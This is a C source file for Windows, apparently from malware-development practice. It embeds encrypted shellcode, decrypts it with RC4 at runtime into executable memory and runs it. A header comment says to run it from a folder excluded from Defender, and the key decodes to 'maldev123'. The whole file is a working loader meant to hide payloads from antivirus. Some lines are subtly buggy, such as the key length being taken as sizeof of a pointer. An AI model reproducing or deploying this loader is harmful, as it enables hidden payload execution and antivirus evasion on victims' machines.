// Run this script in a folder exceptioned by Defender.
#include <stdio.h>
#include <Windows.h>

unsigned char ciphertext[] = {
	// ... (shellcode bytes)
	0x05, 0x0b, 0xc3, 0x55, 0x11, 0x39, 0xe4, 0xcc, 0x78, 0x0c, 0xbb, 0xda, 0x30, 0xe3, 0x1a, 0xeb,
	0x95, 0xc9, 0xd3, 0x98, 0xb0, 0x90, 0x21, 0x29, 0x35, 0xb7, 0xb1, 0xcc, 0xc0, 0x2b, 0x7b, 0x49,
	0x70, 0xb5, 0xc0, 0x20, 0xe4, 0x4f, 0x68, 0x5d, 0xef, 0x14, 0x61, 0x07, 0x3d, 0x1e, 0x66, 0x22,
	0x04, 0x76, 0xd1, 0x10, 0x59, 0xa3, 0x2c, 0x1a, 0x23, 0x5e, 0x2e, 0x21, 0xb6, 0x28, 0x05, 0xc4,
	0xdd, 0xf1, 0x3a, 0xbd, 0xcd, 0xcf, 0xd8, 0xfb, 0xe5, 0xff, 0xe6, 0xaf, 0x5e, 0x0b, 0x67, 0x10,
	0x18, 0xbf, 0xbf, 0x92, 0xda, 0xb3, 0xec, 0x0a, 0x3b, 0x64, 0xc1, 0xc9, 0x55, 0x6e, 0x36, 0x8d,
	0x05, 0x1d, 0x93, 0x6c, 0x08, 0xa1, 0x15, 0xbb, 0xd4, 0xbf, 0xfd, 0x2a, 0x1d, 0xe8, 0x4a, 0x5e,
	0xc7, 0x6f, 0x78, 0xc3, 0x13, 0x7c, 0xb3, 0x2d, 0x0c, 0x0b, 0xc9, 0xa8, 0x8b, 0x24, 0x53, 0x0e,
	0xfb, 0x04, 0x72, 0x2d, 0xb7, 0x6f, 0xe3, 0x59, 0x81, 0x6b, 0xc3, 0xe8, 0x0c, 0xd4, 0xe9, 0x9d,
	0x1d, 0xa7, 0x9d, 0x72, 0x33, 0x40, 0xcd, 0x84, 0xed, 0x52, 0x48, 0x10, 0x6a, 0x7f, 0x42, 0x35,
	0xa7, 0x5c, 0x61, 0xe8, 0x8d, 0x85, 0xd1, 0x28, 0x65, 0xd3, 0xbd, 0x49, 0x2e, 0x21, 0x5e, 0x32,
	0x5f, 0x3d, 0xe4, 0x9d, 0xfc, 0x96, 0x69, 0xb0, 0xff, 0xac, 0x16, 0xb0, 0x7e, 0xcf, 0xdd, 0xc8,
	0x86, 0xf5, 0x72, 0xfc, 0x61, 0x87, 0xe8, 0xbc, 0xab, 0xb8, 0x6e, 0xba, 0xd4, 0x45, 0xf5, 0x13,
	0xfc, 0xab, 0x59, 0x2e, 0x0b, 0xa8, 0x66, 0xa1, 0x6b, 0x51, 0x04, 0x34, 0x65, 0x21, 0x0c, 0x9e,
	0x8b, 0x8e, 0x1c, 0xba, 0x00, 0xbb, 0x12, 0xdc, 0x8d, 0x13, 0x48, 0x0f, 0x08, 0xe3, 0xcb, 0x61,
	0x34, 0xbf, 0xf7, 0xf6, 0xac, 0x9a, 0xb3, 0xc7, 0xa9, 0xb7, 0x49, 0x39, 0x01, 0x63, 0xf8, 0x0a,
	0x8f, 0xc3, 0xe7, 0xe2, 0x1b, 0x25, 0x29, 0xdf, 0x2e, 0x61, 0x15, 0x87, 0x89, 0xdd, 0x5a, 0xd3
};

typedef struct
{
	unsigned int i;
	unsigned int j;
	unsigned char s[256];

} Rc4Context;


void rc4Init(Rc4Context* context, const unsigned char* key, size_t length)
{
	unsigned int i;
	unsigned int j;
	unsigned char temp;

	// Check parameters
	if (context == NULL || key == NULL)
		return ERROR_INVALID_PARAMETER;

	// Clear context
	context->i = 0;
	context->j = 0;

	// Initialize the S array with identity permutation
	for (i = 0; i < 256; i++)
	{
		context->s[i] = i;
	}

	// S is then processed for 256 iterations
	for (i = 0, j = 0; i < 256; i++)
	{
		//Randomize the permutations using the supplied key
		j = (j + context->s[i] + key[i % length]) % 256;

		//Swap the values of S[i] and S[j]
		temp = context->s[i];
		context->s[i] = context->s[j];
		context->s[j] = temp;
	}

}


void rc4Cipher(Rc4Context* context, const unsigned char* input, unsigned char* output, size_t length) {
	unsigned char temp;

	// Restore context
	unsigned int i = context->i;
	unsigned int j = context->j;
	unsigned char* s = context->s;

	// Encryption loop
	while (length > 0)
	{
		// Adjust indices
		i = (i + 1) % 256;
		j = (j + s[i]) % 256;

		// Swap the values of S[i] and S[j]
		temp = s[i];
		s[i] = s[j];
		s[j] = temp;

		// Valid input and output?
		if (input != NULL && output != NULL)
		{
			//XOR the input data with the RC4 stream
			*output = *input ^ s[(s[i] + s[j]) % 256];

			//Increment data pointers
			input++;
			output++;
		}

		// Remaining bytes to process
		length--;
	}

	// Save context
	context->i = i;
	context->j = j;
}


int main() {

	printf("[i] Base Address of Allocated Memory for Encrypted Shellcode : 0x%p \n", ciphertext);

	// Initialization
	Rc4Context ctx = { 0 };

	// Key used for decryption
	unsigned char* key = "bWFsZGV2MTIzCg==";

	rc4Init(&ctx, key, sizeof(key));

	size_t shellcodeLength = sizeof(ciphertext);
	DWORD flAllocationType = MEM_COMMIT | MEM_RESERVE;
	DWORD flProtect = PAGE_EXECUTE_READWRITE;
	PVOID plaintext = VirtualAlloc(NULL, shellcodeLength, flAllocationType, flProtect);

	if (!plaintext)
	{
		fprintf(stderr, "Error allocating memory for the encrypted shellcode.\n");
		return EXIT_FAILURE;
	}

	printf("[+] Base Address of Allocated Memory for Decrypted Shellcode: 0x%p\n", plaintext);

	// Decryption //
	// ciphertext - Encrypted payload to be decrypted
	// plaintext - A buffer that is used to store the outputted plaintext data
	rc4Cipher(&ctx, ciphertext, plaintext, shellcodeLength);

	printf("[!] Shellcode successfully decrypted!\n");

	// Declare a function pointer type that matches the shellcode signature
	typedef void (*ShellcodeFunction)();

	// Cast the executable buffer as a function pointer
	ShellcodeFunction shellcodeFunc = (ShellcodeFunction)plaintext;

	// Call the shellcode function
	shellcodeFunc();

	// Free the executable buffer
	VirtualFree(plaintext, 0, MEM_RELEASE);

	return 0;
}
